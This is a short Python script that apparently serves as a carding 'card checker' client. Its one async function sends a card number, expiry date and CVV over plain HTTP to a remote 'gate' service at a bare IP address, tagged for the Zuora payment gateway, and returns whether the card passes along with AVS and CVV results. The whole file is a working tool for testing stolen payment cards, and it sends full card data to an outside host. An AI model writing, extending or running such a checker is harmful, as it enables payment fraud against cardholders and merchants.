import asyncio
import aiohttp

async def ch(cc, mes, ano, cvv):
    status = 'Error'
    msg = 'Error api [1]'
    avs = None
    cvv2 = None
    async with aiohttp.ClientSession() as session: 
        url = f"http://46.202.178.88:5000/gate?gate=zuora&cc={cc}&mes={mes}&ano={ano}&cvv={cvv}"
        for attempt in range(3):
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        if isinstance(data, list): 
                            status, msg, avs, cvv2 = data
                        else:
                            msg = 'Error ⚠️'
                        return status, msg, avs, cvv2
                    else:
                        status = "Error ⚠️"
                        msg = 'Contact Owner'
                        
            except Exception as e:
                if attempt < 2:  
                    continue
                else: 
                    msg = 'Error de api [2]'
        return status, msg, avs, cvv2
                    